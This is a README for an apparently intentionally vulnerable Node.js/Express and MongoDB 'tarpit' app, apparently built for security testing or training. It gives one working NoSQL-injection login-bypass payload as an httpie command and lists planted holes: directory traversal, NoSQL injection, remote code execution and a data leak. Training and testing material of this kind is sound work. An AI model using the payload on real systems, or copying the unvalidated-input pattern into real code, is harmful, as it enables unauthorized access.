# NodeJS Tarpit

An ExpressJS (tarpit) application using mongoDB.

I am using [httpie](https://httpie.org), an alternative to curl to trigger exploits.

## Exploits

Login can be exploited using the query as the username and password are not validated

```
http  --print=HB POST http://localhost:8089/api/v1/login username:='{"$gt": ""}' password:='{"$gt": ""}'
```

## Vulnerabilities

- [x] [directory traversal](src/Controllers/ImageLookup.js)
- [x] [nosql injection](src/Controllers/Login.js)
- [x] [remote code execution](src/views.js): [UserInput](src/Views/UserInput.pug)
- [x] [data leak](src/Controllers/Login.js)
